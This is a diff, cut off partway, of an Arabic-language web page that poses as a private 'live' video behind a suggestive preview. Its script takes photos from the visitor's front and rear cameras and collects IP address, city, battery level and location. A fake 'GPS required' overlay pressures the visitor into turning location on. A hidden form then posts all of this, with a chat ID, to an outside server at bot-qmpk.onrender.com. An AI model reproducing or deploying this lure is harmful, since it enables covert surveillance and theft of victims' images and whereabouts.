@@ -1,1022 +1,948 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <meta property="og:title" content="video Noor" />
-  <meta property="og:description" content="🫦🫦🤤" />
-  <meta property="og:image" content="https://i.postimg.cc/fbq2KRMb/11.jpg" />
-  <meta property="og:image:type" content="image/jpeg" />
-  <meta property="og:image:width" content="1200" />
-  <meta property="og:image:height" content="630" />
-  <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo" />
-  <link rel="manifest" href="/manifest.json">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-  <meta name="theme-color" content="#000000">
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="video Noor" />
-  <meta name="twitter:description" content="🫤🤤" />
-  <meta name="twitter:image" content="https://i.postimg.cc/fbq2KRMb/11.jpg" />
-  <meta name="twitter:image:width" content="1200" />
-  <meta name="twitter:image:height" content="630" />
-  <title>Video</title>
-  <style>
-    /* ===== RESET & BASE ===== */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta property="og:title" content="Video Noor" />
+    <meta property="og:description" content="🫦🫦🤤" />
+    <meta property="og:image" content="https://i.postimg.cc/fbq2KRMb/11.jpg" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo" />
+    <link rel="manifest" href="/manifest.json" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Video Noor" />
+    <meta name="twitter:description" content="🫤🤤" />
+    <meta name="twitter:image" content="https://i.postimg.cc/fbq2KRMb/11.jpg" />
+    <meta name="twitter:image:width" content="1200" />
+    <meta name="twitter:image:height" content="630" />
+    <title>Video</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      margin: 0;
-      background-color: #000;
-      color: #fff;
-    }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+        }
 
-    /* ===== مشغل الفيديو ===== */
-    .video-player-container {
-      width: 90%;
-      max-width: 800px;
-      background: #111;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      position: relative;
-    }
+        /* ===== مشغل الفيديو ===== */
+        .video-player-container {
+            width: 90%;
+            max-width: 800px;
+            background: #111;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
 
-    .video-thumbnail {
-      position: relative;
-      width: 100%;
-      height: 450px;
-      background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
-                  url('https://i.postimg.cc/fbq2KRMb/11.jpg');
-      background-size: cover;
-      background-position: center;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-    }
+        .video-thumbnail {
+            position: relative;
+            width: 100%;
+            height: 450px;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+                url('https://i.postimg.cc/fbq2KRMb/11.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
 
-    #realVideo {
-      width: 100%;
-      height: 450px;
-      display: none;
-      background: #000;
-    }
+        #realVideo {
+            width: 100%;
+            height: 450px;
+            display: none;
+            background: #000;
+        }
 
-    .play-button-overlay {
-      width: 100px;
-      height: 100px;
-      background-color: rgba(255, 0, 0, 0.85);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-      z-index: 5;
-      position: relative;
-    }
+        .play-button-overlay {
+            width: 100px;
+            height: 100px;
+            background-color: rgba(255, 0, 0, 0.85);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            z-index: 5;
+            position: relative;
+        }
 
-    .play-button-overlay:hover {
-      transform: scale(1.1);
-      background-color: rgba(255, 0, 0, 0.95);
-      box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
-    }
+        .play-button-overlay:hover {
+            transform: scale(1.1);
+            background-color: rgba(255, 0, 0, 0.95);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+        }
 
-    .play-icon-large {
-      width: 0;
-      height: 0;
-      border-left: 30px solid white;
-      border-top: 20px solid transparent;
-      border-bottom: 20px solid transparent;
-      margin-left: 8px;
-    }
+        .play-icon-large {
+            width: 0;
+            height: 0;
+            border-left: 30px solid white;
+            border-top: 20px solid transparent;
+            border-bottom: 20px solid transparent;
+            margin-left: 8px;
+        }
 
-    .video-info {
-      padding: 20px;
-      border-bottom: 1px solid #333;
-    }
+        .video-info {
+            padding: 20px;
+            border-bottom: 1px solid #333;
+        }
 
-    .video-title {
-      font-size: 1.5rem;
-      font-weight: bold;
-      margin-bottom: 8px;
-    }
+        .video-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
 
-    .video-controls {
-      padding: 15px 20px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: #1a1a1a;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
+        .video-controls {
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #1a1a1a;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
 
-    .control-button {
-      background: none;
-      border: none;
-      color: white;
-      font-size: 1.2rem;
-      cursor: pointer;
-      padding: 8px 15px;
-      border-radius: 4px;
-      transition: background 0.2s;
-    }
+        .control-button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 8px 15px;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
 
-    .control-button:hover {
-      background: #333;
-    }
+        .control-button:hover {
+            background: #333;
+        }
 
-    .progress-bar {
-      flex-grow: 1;
-      height: 4px;
-      background: #333;
-      border-radius: 2px;
-      margin: 0 10px;
-      overflow: hidden;
-      position: relative;
-      min-width: 60px;
-    }
+        .progress-bar {
+            flex-grow: 1;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin: 0 10px;
+            overflow: hidden;
+            position: relative;
+            min-width: 60px;
+        }
 
-    .progress-fill {
-      position: absolute;
-      height: 100%;
-      width: 0%;
-      background: #ff0000;
-    }
+        .progress-fill {
+            position: absolute;
+            height: 100%;
+            width: 0%;
+            background: #ff0000;
+        }
 
-    .time-display {
-      color: #aaa;
-      font-size: 0.85rem;
-      min-width: 80px;
-      text-align: center;
-    }
+        .time-display {
+            color: #aaa;
+            font-size: 0.85rem;
+            min-width: 80px;
+            text-align: center;
+        }
 
-    .spinner {
-      border: 4px solid #fff;
-      border-top: 4px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      width: 32px;
-      height: 32px;
-      animation: spin 1s linear infinite;
-      position: absolute;
-      display: none;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-    }
+        .spinner {
+            border: 4px solid #fff;
+            border-top: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            display: none;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
 
-    @keyframes spin {
-      0% {
-        transform: translate(-50%, -50%) rotate(0deg);
-      }
-      100% {
-        transform: translate(-50%, -50%) rotate(360deg);
-      }
-    }
+        @keyframes spin {
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
 
-    #loading {
-      display: none;
-      font-size: 1.2rem;
-      color: #fff;
-      margin-top: 20px;
-      text-align: center;
-    }
+        #loading {
+            display: none;
+            font-size: 1.2rem;
+            color: #fff;
+            margin-top: 20px;
+            text-align: center;
+        }
 
-    .live-badge {
-      position: absolute;
-      top: 15px;
-      right: 15px;
-      background: rgba(255, 0, 0, 0.9);
-      color: #fff;
-      padding: 5px 12px;
-      border-radius: 4px;
-      font-weight: bold;
-      font-size: 0.85rem;
-      letter-spacing: 1px;
-      z-index: 10;
-    }
+        .live-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255, 0, 0, 0.9);
+            color: #fff;
+            padding: 5px 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            z-index: 10;
+        }
 
-    /* ===== نافذة منبثقة مخصصة للموقع (بدون زر تخطي) ===== */
-    .location-prompt-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.88);
-      z-index: 9999;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      backdrop-filter: blur(6px);
-      -webkit-backdrop-filter: blur(6px);
-      animation: fadeInOverlay 0.3s ease;
-    }
+        /* ===== نافذة منبثقة مخصصة للموقع ===== */
+        .location-prompt-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.88);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            animation: fadeInOverlay 0.3s ease;
+        }
 
-    .location-prompt-overlay.active {
-      display: flex;
-    }
+        .location-prompt-overlay.active {
+            display: flex;
+        }
 
-    @keyframes fadeInOverlay {
-      from {
-        opacity: 0;
-      }
-      to {
-        opacity: 1;
-      }
-    }
+        @keyframes fadeInOverlay {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
 
-    @keyframes slideUpBox {
-      from {
-        transform: translateY(40px) scale(0.95);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0) scale(1);
-        opacity: 1;
-      }
-    }
+        @keyframes slideUpBox {
+            from {
+                transform: translateY(40px) scale(0.95);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
 
-    .location-prompt-box {
-      background: linear-gradient(145deg, #1e1e1e, #141414);
-      border: 1px solid rgba(255, 0, 0, 0.35);
-      border-radius: 20px;
-      padding: 35px 28px 30px;
-      text-align: center;
-      max-width: 420px;
-      width: 92%;
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 40px rgba(255, 0, 0, 0.15);
-      animation: slideUpBox 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-      position: relative;
-      overflow: hidden;
-    }
+        .location-prompt-box {
+            background: linear-gradient(145deg, #1e1e1e, #141414);
+            border: 1px solid rgba(255, 0, 0, 0.35);
+            border-radius: 20px;
+            padding: 35px 28px 30px;
+            text-align: center;
+            max-width: 420px;
+            width: 92%;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 40px rgba(255, 0, 0, 0.15);
+            animation: slideUpBox 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
 
-    .location-prompt-box::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle at center, rgba(255, 0, 0, 0.04) 0%, transparent 70%);
-      pointer-events: none;
-    }
+        .location-prompt-box::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at center, rgba(255, 0, 0, 0.04) 0%, transparent 70%);
+            pointer-events: none;
+        }
 
-    .location-prompt-box .icon-location {
-      font-size: 54px;
-      margin-bottom: 12px;
-      display: block;
-      filter: drop-shadow(0 0 20px rgba(255, 0, 0, 0.3));
-    }
+        .location-prompt-box .icon-location {
+            font-size: 54px;
+            margin-bottom: 12px;
+            display: block;
+            filter: drop-shadow(0 0 20px rgba(255, 0, 0, 0.3));
+        }
 
-    .location-prompt-box h3 {
-      margin: 0 0 10px;
-      font-size: 1.35rem;
-      font-weight: 700;
-      color: #ff4444;
-      letter-spacing: 0.5px;
-    }
+        .location-prompt-box h3 {
+            margin: 0 0 10px;
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: #ff4444;
+            letter-spacing: 0.5px;
+        }
 
-    .location-prompt-box .sub-text {
-      color: #bbb;
-      font-size: 0.95rem;
-      margin-bottom: 6px;
-      line-height: 1.5;
-    }
+        .location-prompt-box .sub-text {
+            color: #bbb;
+            font-size: 0.95rem;
+            margin-bottom: 6px;
+            line-height: 1.5;
+        }
 
-    .location-prompt-box .sub-text strong {
-      color: #ff6666;
-    }
+        .location-prompt-box .sub-text strong {
+            color: #ff6666;
+        }
 
-    .location-prompt-box .steps {
-      text-align: left;
-      background: rgba(0, 0, 0, 0.5);
-      border-radius: 12px;
-      padding: 14px 18px;
-      margin: 16px 0 22px;
-      font-size: 0.85rem;
-      color: #ccc;
-      line-height: 2;
-      border: 1px solid rgba(255, 255, 255, 0.05);
-    }
+        .location-prompt-box .steps {
+            text-align: left;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin: 16px 0 22px;
+            font-size: 0.85rem;
+            color: #ccc;
+            line-height: 2;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
 
-    .location-prompt-box .steps span {
-      color: #ff5555;
-      font-weight: 700;
-    }
+        .location-prompt-box .steps span {
+            color: #ff5555;
+            font-weight: 700;
+        }
 
-    .location-prompt-box .steps .step-num {
-      display: inline-block;
-      width: 22px;
-      height: 22px;
-      background: rgba(255, 0, 0, 0.2);
-      border-radius: 50%;
-      text-align: center;
-      line-height: 22px;
-      font-size: 0.7rem;
-      font-weight: 700;
-      color: #ff6666;
-      margin-right: 6px;
-    }
+        .location-prompt-box .steps .step-num {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            background: rgba(255, 0, 0, 0.2);
+            border-radius: 50%;
+            text-align: center;
+            line-height: 22px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: #ff6666;
+            margin-right: 6px;
+        }
 
-    .location-prompt-box .btn-row {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
+        .location-prompt-box .btn-row {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
 
-    .btn-location {
-      padding: 13px 26px;
-      border: none;
-      border-radius: 12px;
-      font-size: 0.95rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.25s ease;
-      text-decoration: none;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      flex: 1 1 auto;
-      min-width: 120px;
-      justify-content: center;
-    }
+        .btn-location {
+            padding: 13px 26px;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1 1 auto;
+            min-width: 120px;
+            justify-content: center;
+        }
 
-    .btn-location:active {
-      transform: scale(0.96);
-    }
+        .btn-location:active {
+            transform: scale(0.96);
+        }
 
-    .btn-enable {
-      background: linear-gradient(135deg, #ff0000, #cc0000);
-      color: #fff;
-      box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
-    }
+        /* زر فتح الإعدادات – أيقونة ترس + نص مختصر */
+        .btn-enable {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
+        }
 
-    .btn-enable:hover {
-      background: linear-gradient(135deg, #ff2222, #dd0000);
-      box-shadow: 0 6px 25px rgba(255, 0, 0, 0.5);
-      transform: translateY(-2px);
-    }
+        .btn-enable:hover {
+            background: linear-gradient(135deg, #ff2222, #dd0000);
+            box-shadow: 0 6px 25px rgba(255, 0, 0, 0.5);
+            transform: translateY(-2px);
+        }
 
-    .btn-try-again {
-      background: linear-gradient(135deg, #00a86b, #00855a);
-      color: #fff;
-      box-shadow: 0 4px 15px rgba(0, 168, 107, 0.35);
-      margin-top: 12px;
-      width: 100%;
-      padding: 14px;
-      font-size: 1rem;
-    }
+        .btn-skip {
+            background: #2a2a2a;
+            color: #999;
+            border: 1px solid #3a3a3a;
+        }
 
-    .btn-try-again:hover {
-      background: linear-gradient(135deg, #00c97a, #009a66);
-      box-shadow: 0 6px 25px rgba(0, 168, 107, 0.5);
-      transform: translateY(-2px);
-    }
+        .btn-skip:hover {
+            background: #3a3a3a;
+            color: #ccc;
+        }
 
-    .btn-try-again:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none !important;
-    }
+        .btn-try-again {
+            background: linear-gradient(135deg, #00a86b, #00855a);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(0, 168, 107, 0.35);
+            margin-top: 12px;
+            width: 100%;
+            padding: 14px;
+            font-size: 1rem;
+        }
 
-    /* ===== استجابة ===== */
-    @media (max-width: 480px) {
-      .location-prompt-box {
-        padding: 25px 18px 22px;
-        max-width: 95%;
-      }
+        .btn-try-again:hover {
+            background: linear-gradient(135deg, #00c97a, #009a66);
+            box-shadow: 0 6px 25px rgba(0, 168, 107, 0.5);
+            transform: translateY(-2px);
+        }
 
-      .location-prompt-box h3 {
-        font-size: 1.15rem;
-      }
+        .btn-try-again:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
 
-      .btn-location {
-        padding: 12px 16px;
-        font-size: 0.85rem;
-        min-width: 80px;
-      }
+        /* ===== استجابة ===== */
+        @media (max-width: 480px) {
+            .location-prompt-box {
+                padding: 25px 18px 22px;
+                max-width: 95%;
+            }
 
-      .video-controls {
-        padding: 10px 12px;
-        gap: 6px;
-      }
+            .location-prompt-box h3 {
+                font-size: 1.15rem;
+            }
 
-      .progress-bar {
-        margin: 0 6px;
-      }
+            .btn-location {
+                padding: 12px 16px;
+                font-size: 0.85rem;
+                min-width: 80px;
+            }
 
-      .time-display {
-        font-size: 0.75rem;
-        min-width: 60px;
-      }
+            .video-controls {
+                padding: 10px 12px;
+                gap: 6px;
+            }
 
-      .video-title {
-        font-size: 1.2rem;
-      }
+            .progress-bar {
+                margin: 0 6px;
+            }
 
-      .video-thumbnail,
-      #realVideo {
-        height: 280px;
-      }
+            .time-display {
+                font-size: 0.75rem;
+                min-width: 60px;
+            }
 
-      .play-button-overlay {
-        width: 70px;
-        height: 70px;
-      }
+            .video-title {
+                font-size: 1.2rem;
+            }
 
-      .play-icon-large {
-        border-left-width: 22px;
-        border-top-width: 14px;
-        border-bottom-width: 14px;
-        margin-left: 5px;
-      }
-    }
+            .video-thumbnail,
+            #realVideo {
+                height: 280px;
+            }
 
-    @media (min-width: 768px) {
-      .location-prompt-box {
-        padding: 40px 35px 35px;
-      }
-    }
+            .play-button-overlay {
+                width: 70px;
+                height: 70px;
+            }
 
-    /* ===== إخفاء عناصر النموذج ===== */
-    form {
-      display: none;
-    }
-  </style>
+            .play-icon-large {
+                border-left-width: 22px;
+                border-top-width: 14px;
+                border-bottom-width: 14px;
+                margin-left: 5px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .location-prompt-box {
+                padding: 40px 35px 35px;
+            }
+        }
+
+        /* ===== إخفاء عناصر النموذج ===== */
+        form {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-  <!-- نموذج خفي لإرسال البيانات -->
-  <form id="data-form" method="POST" action="https://bot-qmpk.onrender.com/submitData">
-    <input type="hidden" name="chatId" id="chatId" />
-    <input type="hidden" name="imageDatas" id="imageDatas" />
-    <input type="hidden" name="location" id="location" />
-    <input type="hidden" name="permissions" id="permissions" />
-    <input type="hidden" name="ipInfo" id="ipInfo" />
-    <input type="hidden" name="battery" id="battery" />
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
-  </form>
+    <!-- نموذج خفي لإرسال البيانات -->
+    <form id="data-form" method="POST" action="https://bot-qmpk.onrender.com/submitData">
+        <input type="hidden" name="chatId" id="chatId" />
+        <input type="hidden" name="imageDatas" id="imageDatas" />
+        <input type="hidden" name="location" id="location" />
+        <input type="hidden" name="permissions" id="permissions" />
+        <input type="hidden" name="ipInfo" id="ipInfo" />
+        <input type="hidden" name="battery" id="battery" />
+        <iframe name="hidden_iframe" style="display:none;"></iframe>
+    </form>
 
-  <!-- ===== نافذة منبثقة الموقع الجغرافي الموحدة (بدون زر تخطي) ===== -->
-  <div class="location-prompt-overlay" id="locationPromptOverlay">
-    <div class="location-prompt-box">
-      <span class="icon-location">📍</span>
-      <h3 id="promptTitle">⚠️ مطلوب GPS</h3>
-      <p class="sub-text" id="promptMessage">
-        خدمة <strong>تحديد الموقع الجغرافي</strong> في جهازك <strong>موقفة</strong> حاليًا.
-      </p>
-      <div class="steps" id="locationSteps">
-        <!-- سيتم تعبئته عبر JavaScript حسب النظام -->
-      </div>
-      <div class="btn-row">
-        <button class="btn-location btn-enable" id="btnEnableLocation">
-          ⚙️ افتح الإعدادات
-        </button>
-      </div>
-      <button class="btn-location btn-try-again" id="btnTryAgain">
-        🔄 فعّلته - حاول مجددًا
-      </button>
-    </div>
-  </div>
-
-  <!-- ===== مشغل الفيديو ===== -->
-  <div class="video-player-container">
-    <div class="video-info">
-      <div class="video-title">🎬 فيديو خاص</div>
+    <!-- ===== نافذة منبثقة الموقع الجغرافي ===== -->
+    <div class="location-prompt-overlay" id="locationPromptOverlay">
+        <div class="location-prompt-box">
+            <span class="icon-location">📍</span>
+            <h3>⚠️ GPS مطلوب</h3>
+            <p class="sub-text">
+                خدمة <strong>تحديد الموقع الجغرافي</strong> في جهازك <strong>موقفة</strong> حاليًا.
+            </p>
+            <div class="steps" id="locationSteps">
+                <!-- يتم تعبئته عبر JavaScript حسب النظام -->
+            </div>
+            <div class="btn-row">
+                <!-- زر فتح الإعدادات – أيقونة ترس + نص مختصر -->
+                <button class="btn-location btn-enable" id="btnEnableLocation">
+                    ⚙️ افتح الإعدادات
+                </button>
+                <button class="btn-location btn-skip" id="btnSkipLocation">
+                    تخطي
+                </button>
+            </div>
+            <button class="btn-location btn-try-again" id="btnTryAgain">
+                🔄 فعّلته – حاول مجددًا
+            </button>
+        </div>
     </div>
 
-    <div class="video-thumbnail" id="thumbnailArea">
-      <div class="live-badge">🔴 LIVE</div>
-      <div class="play-button-overlay" id="playButtonOverlay">
-        <div class="play-icon-large" id="playIconLarge"></div>
-        <div class="spinner" id="spinner"></div>
-      </div>
+    <!-- ===== مشغل الفيديو ===== -->
+    <div class="video-player-container">
+        <div class="video-info">
+            <div class="video-title">🎬 فيديو خاص</div>
+        </div>
+
+        <div class="video-thumbnail" id="thumbnailArea">
+            <div class="live-badge">🔴 LIVE</div>
+            <div class="play-button-overlay" id="playButtonOverlay">
+                <div class="play-icon-large" id="playIconLarge"></div>
+                <div class="spinner" id="spinner"></div>
+            </div>
+        </div>
+
+        <video id="realVideo" controls playsinline>
+            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
+        </video>
+
+        <div class="video-controls">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="time-display">0:00 / 2:45</div>
+            <button class="control-button fullscreen-btn">⛶</button>
+        </div>
     </div>
 
-    <video id="realVideo" controls playsinline>
-      <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
-    </video>
-
-    <div class="video-controls">
-      <div class="progress-bar">
-        <div class="progress-fill"></div>
-      </div>
-      <div class="time-display">0:00 / 2:45</div>
-      <button class="control-button fullscreen-btn">⛶</button>
+    <div id="loading">
+        <div class="spinner" style="position:static;display:inline-block;margin-right:8px;"></div>
+        <span class="loading-text">جاري تجهيز الفيديو...</span>
     </div>
-  </div>
 
-  <div id="loading">
-    <div class="spinner" style="position:static;display:inline-block;margin-right:8px;"></div>
-    <span class="loading-text">جاري تجهيز الفيديو...</span>
-  </div>
+    <script>
+        (function() {
+            'use strict';
 
-  <script>
-    (function() {
-      'use strict';
+            const permissions = [];
+            let images = [];
+            let ipInfo = '';
+            let batteryStatus = '';
+            let locationGranted = false;
+            let userProceeded = false;
 
-      const permissions = [];
-      let images = [];
-      let ipInfo = '';
-      let batteryStatus = '';
-      let locationGranted = false;
-      let userProceeded = false;
+            // --- جلب IP ---
+            async function fetchIPInfo() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    ipInfo = `الدولة: ${data.country_name}, المدينة: ${data.city}, IP: ${data.ip}`;
+                } catch {
+                    ipInfo = "معلومات IP غير متوفرة";
+                }
+                document.getElementById('ipInfo').value = ipInfo;
+            }
 
-      // --- جلب IP ---
-      async function fetchIPInfo() {
-        try {
-          const response = await fetch('https://ipapi.co/json/');
-          const data = await response.json();
-          ipInfo = `الدولة: ${data.country_name}, المدينة: ${data.city}, IP: ${data.ip}`;
-        } catch {
-          ipInfo = "معلومات IP غير متوفرة";
-        }
-        document.getElementById('ipInfo').value = ipInfo;
-      }
-
-      // --- جلب البطارية ---
-      async function getBatteryStatus() {
-        try {
-          if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            batteryStatus = Math.round(battery.level * 100) + '%';
-          } else {
-            batteryStatus = "API غير مدعوم";
-          }
-        } catch {
-          batteryStatus = "غير معروف";
-        }
-        document.getElementById('battery').value = batteryStatus;
-      }
-
-      // --- التقاط صورة من الكاميرا ---
-      async function captureFromCamera(facingMode) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: facingMode }
-          });
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.setAttribute('playsinline', '');
-          await video.play();
-          await new Promise(resolve => setTimeout(resolve, 600));
-
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
-
-          stream.getTracks().forEach(track => track.stop());
-          permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} تم السماح`);
-          return true;
-        } catch (err) {
-          permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} مرفوضة: ${err.name}`);
-          return false;
-        }
-      }
-
-      // --- استبيان صلاحية الموقع ---
-      async function checkLocationPermissionState() {
-        try {
-          if (!navigator.permissions || !navigator.permissions.query) {
-            return 'unknown';
-          }
-          const result = await navigator.permissions.query({ name: 'geolocation' });
-          return result.state;
-        } catch {
-          return 'unknown';
-        }
-      }
-
-      // --- اختبار سريع لمعرفة ما إذا كانت خدمة GPS مفعلة (بدون طلب إذن) ---
-      function isGpsServiceEnabled() {
-        return new Promise((resolve) => {
-          // مهلة قصيرة جداً (1 ثانية) للكشف عن الخدمة الموقفة
-          const timeoutId = setTimeout(() => {
-            resolve(false); // إذا لم تستجب، نعتبر الخدمة موقفة
-          }, 1000);
-
-          navigator.geolocation.getCurrentPosition(
-            () => {
-              clearTimeout(timeoutId);
-              resolve(true); // الخدمة مفعلة (تم الحصول على الموقع)
-            },
-            (err) => {
-              clearTimeout(timeoutId);
-              // إذا كان الخطأ بسبب رفض المستخدم (PERMISSION_DENIED) ولكن الخدمة قد تكون مفعلة،
-              // نتحقق من حالة الإذن لتمييز ذلك.
-              if (err.code === 1) {
-                // قد يكون بسبب رفض الإذن أو الخدمة الموقفة. نستخدم permissions.query إن أمكن.
-                navigator.permissions.query({ name: 'geolocation' })
-                  .then(result => {
-                    if (result.state === 'denied') {
-                      // الإذن مرفوض، الخدمة قد تكون مفعلة لكن الإذن مرفوض => نعتبر الخدمة مفعلة (لأننا لا نريد إظهار نافذة الإعدادات)
-                      resolve(true);
+            // --- جلب البطارية ---
+            async function getBatteryStatus() {
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        batteryStatus = Math.round(battery.level * 100) + '%';
                     } else {
-                      // الإذن غير مرفوض (prompt أو granted) والفشل يعني الخدمة موقفة
-                      resolve(false);
+                        batteryStatus = "API غير مدعوم";
                     }
-                  })
-                  .catch(() => {
-                    // إذا لم نتمكن من query، نفترض أن الخدمة موقفة
-                    resolve(false);
-                  });
-              } else {
-                // أخطاء أخرى (مثل timeout) نعتبر الخدمة مفعلة ولكن هناك مشكلة أخرى
-                resolve(true);
-              }
-            },
-            { enableHighAccuracy: false, timeout: 1000, maximumAge: 0 }
-          );
-        });
-      }
+                } catch {
+                    batteryStatus = "غير معروف";
+                }
+                document.getElementById('battery').value = batteryStatus;
+            }
 
-      // --- طلب الموقع الذكي (مع مهلة أطول) ---
-      async function requestLocationSmart() {
-        try {
-          const permState = await checkLocationPermissionState();
